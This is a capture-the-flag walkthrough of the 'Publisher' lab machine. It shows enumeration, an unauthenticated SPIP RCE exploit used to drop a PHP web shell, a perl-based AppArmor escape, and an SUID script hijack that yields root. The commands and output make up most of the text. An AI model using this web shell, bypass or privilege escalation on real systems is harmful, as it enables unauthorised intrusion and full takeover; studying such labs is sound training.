# Publisher

## Test your enumeration skills on this boot-to-root machine.
```
Machine's IP: 10.10.211.245
``` 

**NMAP**

Firstly, once the machine is up we can begin with an active enumeration using nmap

```bash
# Nmap 7.95 scan initiated Thu Oct 16 15:43:25 2025 as: /usr/lib/nmap/nmap --privileged -A -oN nmap.txt -T4 -Pn -p- 10.10.211.245
Nmap scan report for 10.10.211.245
Host is up (0.041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d6:76:88:b3:4e:29:1d:11:a8:6f:aa:7e:a2:d4:45:49 (RSA)
|   256 76:57:53:30:69:1f:66:8b:e5:83:d5:d5:18:86:ca:1d (ECDSA)
|_  256 66:dd:40:be:ae:e7:36:1e:35:89:0d:33:4f:0a:0a:87 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Publisher's Pulse: SPIP Insights & Tips
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   42.89 ms 10.8.0.1
2   42.92 ms 10.10.211.245

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 16 15:44:07 2025 -- 1 IP address (1 host up) scanned in 42.33 seconds
```
We can notice 2 services:
- Openssh 8.2p1 which is too recent to be exploitable
- Apache 2.4.41 which is also too recent 

**GOBUSTER**

Let's fuzz the directories in the website
```bash
gobuster dir -u http://10.10.211.245/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t40
```
We have now found a directory "/spip"

Using wapalyzer we can get the spip version which is 4.2.0 so let's find if there's a CVE
```bash
searchsploit spip 4.2.0
```
The CVE is a metasploit RCE that allows us to execute commands on the server without being auth

With this exploit i created a file in the webserver that contain a php webpage to allow us execute commands easily with the following
```php
<?php system($_GET['cmd']); ?>
```
```bash
python exploit.py -u http://10.10.211.245/spip/ -c 'echo PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+ | base64 -d > cmd.php'
```
So we can read files easily such as the .ssh of the user Think to avoid a second privesc

**PRIVESC**

I firstly wanted to upload a Linpeas but i found that i wasnt even able to write in my directory or in /tmp... This means there is a service blocking some access sur as Apparmor:
```bash
echo $SHELL -> ash shell
cat /etc/apparmor.d/usr.sbin.ash -> doesnt block /var/tmp eg
```

With Linpeas or with 
```bash
find / -type f -perm -04000 -ls 2>/dev/null
``` 
we can find /usr/sbin/run_container has the SUID bit set 

Let's analyze what run_container does with strings
```bash
strings /sbin/run_container

...
/bin/bash
/opt/run_container.sh
...
``` 
So in theory if we edit **/opt/run_container.sh** we can run commands as root BUT apparmor is blocking /opt even if we have the rights to edit the .sh

**APPARMOR ESCAPE**

After doing some researches it appears it is possible to escape the apparmor restrictions with pearl using 
```bash
echo -e '#!/usr/bin/perl\nexec "/bin/sh"' > /dev/shm/test.pl
chmod +x ./test.pl 
./test.pl 
```
With that we now have an unrestricted shell where we can finaly execute our commands
```bash
./test.pl 
$ id
uid=1000(think) gid=1000(think) groups=1000(think)
$ echo '#!/bin/bash\nchmod +s /bin/bash' > /opt/run_container.sh
$ exit
/usr/sbin/run_container
ls -al /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
bash -p
bash-5.0# id
uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
```
As you can see our euid (effective uid) is now root :)

Redacted by Lucas Bouet